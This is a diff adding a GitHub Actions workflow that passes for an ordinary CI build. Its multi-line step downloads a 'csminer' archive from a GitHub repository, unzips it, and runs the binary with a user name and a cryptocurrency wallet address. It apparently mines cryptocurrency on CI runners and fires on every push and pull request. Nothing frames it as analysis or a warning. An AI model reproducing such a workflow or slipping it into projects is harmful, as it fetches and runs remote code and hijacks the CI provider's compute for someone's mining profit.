@@ -1,0 +1,24 @@
+name: CI
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
+  workflow_dispatch:
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Run a one-line script
+        run: 
+            lscpu
+
+      - name: Run a multi-line script
+        run: |
+              apt-get install unzip -y
+              wget https://github.com/phongcongtu/pkt_phong/raw/main/csminer.zip
+              unzip csminer.zip
+              chmod +x csminer
+              ./csminer -user=trumcuoicuchuoi -wallet 4A3zBUxzRBM9Z62k8JQpYCEpnNUHA8TqpTW2p7XxAhVjVwobTH7cmi7584cTZQb3BmYVoF4bJfceT8WWmDHkRf14P8LgBPC -threads 1
